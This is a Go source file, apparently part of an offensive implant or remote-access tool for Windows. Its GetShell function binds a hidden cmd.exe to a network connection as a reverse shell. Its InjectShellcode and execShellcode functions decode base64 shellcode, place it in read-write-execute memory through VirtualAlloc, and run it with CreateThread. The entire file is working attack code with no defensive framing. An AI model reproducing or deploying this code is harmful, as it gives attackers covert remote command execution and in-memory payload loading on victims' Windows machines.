// +build windows !linux !darwin !freebsd

package remoteop

import (
	"encoding/base64"
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"log"
	"net"
	"os/exec"
	"unsafe"
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
)

// GetShell pops an *exec.Cmd and return it to be used in a reverse shell
func GetShell(conn net.Conn) {
	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Stdout = conn
	exitstatus := cmd.Run()

	copydata := func(r io.Reader, w io.Writer) {
		_, err := io.Copy(w, r)
		if err != nil {
			log.Println(err)
		}
	}

	go copydata(cmd.Stdin, conn)
	go copydata(conn, cmd.Stdout)
	go copydata(conn, cmd.Stderr)

	exitSignal := make(chan int, 1)
	closeCheck := func() {
		if exitstatus == nil {
			fmt.Println("** Process Exited. **\n")
			exitSignal <- 1
		} else {
			fmt.Println("** Process Unexpected Exited. ** \n")
			exitSignal <- 2
		}
	}
	go closeCheck()
	exitData := <-exitSignal
	switch exitData {
	case 1:
		return
	case 2:
		fmt.Println("Function Exit with Error.")
		return
	default:
		return
	}
}

// InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go execShellcode(shellcode)
		}
	}
}

// ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
// and executes it via a syscall.Syscall call.
func execShellcode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := windows.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	// Ugly, but works
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	procCreateThread.Call(0, 0, address, 0, 0, 0)
}
